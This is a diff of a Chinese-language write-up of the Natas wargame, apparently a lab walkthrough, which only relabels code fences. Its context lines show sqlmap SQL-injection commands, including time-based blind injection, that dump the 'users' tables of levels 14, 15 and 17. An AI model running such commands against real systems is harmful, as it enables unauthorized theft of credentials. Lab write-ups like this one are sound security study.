@@ -598,7 +598,7 @@ if(array_key_exists("username", $_REQUEST)) {
 
 那剩下的就简单了
 
-```shell
+```bash
 sqlmap -r sqlmap.txt --dbms=mysql --threads 10 --batch --dbs
 ```
 
@@ -606,7 +606,7 @@ sqlmap -r sqlmap.txt --dbms=mysql --threads 10 --batch --dbs
 
 快进到数据提取
 
-```shell
+```bash
 sqlmap -r sqlmap.txt --dbms=mysql --threads 10 --batch -D natas14 -T users --dump
 
 Database: natas14
@@ -662,7 +662,7 @@ if(array_key_exists("username", $_REQUEST)) {
 
 尝试使用 sqlmap 进行自动化探测，经过测试，需要使用 `--level=3` 参数才可实现
 
-```shell
+```bash
 sqlmap -r sqlmap.txt --dbms=mysql --threads 10 --level=3
 ```
 
@@ -672,7 +672,7 @@ sqlmap -r sqlmap.txt --dbms=mysql --threads 10 --level=3
 
 ![img](img/image_20250129-152949.png)
 
-```shell
+```bash
 sqlmap -r sqlmap.txt --dbms=mysql --level=3 --batch -D natas15 -T users --dump
 
 Database: natas15
@@ -879,7 +879,7 @@ if(array_key_exists("username", $_REQUEST)) {
 
 一眼啥都没有，就是时间盲注或者报错盲注，交给sqlmap
 
-```shell
+```bash
 sqlmap --proxy=http://127.0.0.1:7890 -r sqlmap.txt --dbms=mysql --level=3 --time-sec 2 --batch -D natas17 -T users
 ```
 
@@ -887,7 +887,7 @@ sqlmap --proxy=http://127.0.0.1:7890 -r sqlmap.txt --dbms=mysql --level=3 --time
 
 即可得到结果
 
-```shell
+```bash
 sqlmap --proxy=http://127.0.0.1:7890 -r sqlmap.txt --dbms=mysql --level=3 --time-sec 2 --batch -D natas17 -T users --dump
 
 ser3
